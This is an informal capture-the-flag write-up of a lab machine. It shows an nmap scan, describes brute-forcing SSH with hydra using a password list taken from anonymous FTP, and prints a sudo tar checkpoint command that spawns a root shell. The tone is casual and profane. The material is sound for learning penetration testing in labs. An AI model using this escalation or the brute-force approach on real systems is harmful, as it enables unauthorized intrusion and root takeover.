lol easiest one till date
this was like a speed run
in fucking 6 minutes lol

nmapped
```
# Nmap 7.80 scan initiated Tue Aug 19 19:49:08 2025 as: nmap -A -Pn -oN nmap 10.10.229.80
Nmap scan report for 10.10.229.80
Host is up (0.22s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.19.181
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 19 19:49:51 2025 -- 1 IP address (1 host up) scanned in 43.20 seconds

```

anon ftp was on
got the passwd list 
bruted it using hydra and got in? too easy to be true

then enumerated and found 
```
User lin may run the following commands on ip-10-10-229-80:
    (root) /bin/tar
```

and bam 
`lin@ip-10-10-229-80:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

got root lol